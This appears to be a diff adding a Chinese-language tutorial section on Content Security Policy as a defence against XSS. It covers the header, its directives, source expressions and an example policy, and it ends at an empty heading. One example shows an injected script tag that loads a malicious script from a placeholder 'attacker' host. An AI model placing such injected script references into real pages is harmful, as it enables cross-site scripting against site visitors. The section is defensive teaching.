@@ -399,3 +399,117 @@ document.querySelector('a').href = **userInput**
 
 ### Content Security Policy (CSP)
 
+使用验证输入来防止XSS攻击的劣势在于即使存在一丝的漏洞也会使得你的网站遭到攻击。最近的一个被称为Content Security Policy（CSP）的标准能够减少这个风险。
+
+CSP对查看你页面的浏览器做出了限制，以确保它只能使用来自可信赖来源下载的资源。一个*资源*可以是脚本，样式，图片，或者其他被页面引用的文件。这意味着即使攻击者成功的在你的网站中注入了恶意内容，CSP也能免于它被执行。
+
+CSP遵循下列规则
+
+- **不许允不可信赖的来源**：只有来自明确定义过的可信赖来源的外链资源才可以被下载
+- **不允许内联资源**：行内脚本和内联CSS不允许被执行。
+- **不允许eval函数**：Javascript的`eval`函数不可以被使用
+
+#### CSP实战
+
+在下面的例子中，一个攻击者成功在一个页面中注入了恶意代码：
+
+```
+<html>
+Latest comment:
+<script src="http://attacker/malicious-script.js"></script>
+</html>
+```
+在恰当配置CSP的情况下，浏览器不会加载和执行`malicious-script.js`，因为`http://attacker`域名不在可信赖的来源集合中。即使在这个例子中网站没能成功的验证输入的安全性，CSP策略也能防止来自因为漏洞引起的损害。
+
+退一步说纵然攻击者注入了行内脚本代码而不似海外链一个文件，恰当的CSP策略也能拒绝行内脚本的执行来防止因为漏洞引起的损害。
+
+#### 如何启用CSP
+
+默认情况下浏览器并不强制启用CSP。如果需要在你的网站上启用CSP，页面必须在服务器返回时添加额外的HTTP头：`Content-Security-Policy`。任何拥有这个返回头的页面即表示它有自己的安全策略，浏览需要特别对待，也即告诉浏览器请支持CSP。
+
+因为安全策略是附属于每一个HTTP返回中，所以对服务器来说可以逐个页面的设置安全策略。通过在每一个返回中添加统一的CSP头来使得整个站点都可以采取同一个策略。
+
+`Content-Security-Policy`的值是定义了单个或多个能影响你站点安全策略的字符串。字符串的语法会在接下来的内容进行描述。
+
+*注意：这一节中为了更清晰的展现，例子中的头信息我们使用换行和缩进，在实际的头中请勿这么书写*
+
+#### CSP语法
+
+CSP头的语法如下：
+
+```
+Content-Security-Policy:
+    directive source-expression, source-expression, ...;
+    directive ...;
+    ...
+```
+
+语法由两部分元素组成：
+- **指令**：从一个预设的清单中选取的指定资源类型的名称
+- **来源表达式**：描述一个或多个能够下载资源的服务器
+
+对于每一个指令来说，来源表达式定义了哪些来源可以用来下载不同类型的资源。
+
+##### 指令
+
+CSP头能够使用的指定如下：
+
+- connect-src
+- font-src
+- frame-src
+- img-src
+- media-src
+- object-src
+- script-src
+- style-src
+
+除此之外，特别的指令`default-src`用于为所有指令提供一个没有包含在头中的默认值。
+
+##### 来源表达式
+
+来源表达式的语法如下：
+
+```
+protocol://host-name:port-number
+```
+
+主机名称（host name）可以以`*`开头，也就是说任意提供的主机名称下的子域名都是允许的。相似的端口号也能是`*`，也就意味着所有的端口号都有效。另外，协议和端口号也可以忽略不填。最后，协议可以自己定义，这使得使用HTTPS协议加载所有资源也可能。
+
+作为上述语法的补充，来源表达式还能够额外选自有特殊意义的四个关键字之一（包括引号）
+
+- `'none'`: 不允许任何资源
+- `'self'`: 只允许来自提供页面服务主机的资源
+- `'unsafe-inline'`: 允许页面内嵌的所有资源，比如行内`<script>`元素，`<style>`元素，和`javascript:`开头的URL
+- `'unsafe-eval'`: 允许使用Javascript的`eval`函数
+
+值得注意的是无论CSP何时被使用，行内资源和`eval`函数默认都是不允许自动执行的。使用`unsafe-inline`和`unsafe-eval`是唯一启用使用他们的方式。
+
+#### 一个策略实例
+
+```
+Content-Security-Policy:
+    script-src 'self' scripts.example.com;
+    media-src 'none';
+    img-src *;
+    default-src 'self' http://*.example.com
+```
+
+在这个策略例子中，页面受制于以下的限制：
+
+- 脚本只允许下载自提供页面的主机和`scripts.example.com`
+- 不允许任何音频和视频下载
+- 图片可以从任何主机处下载
+- 所有的其他资源只允许下载自提供页面的主机和`example.com`的任何子域名
+
+#### CSP的状态 
+
+
+
+
+
+
+
+
+
+
+
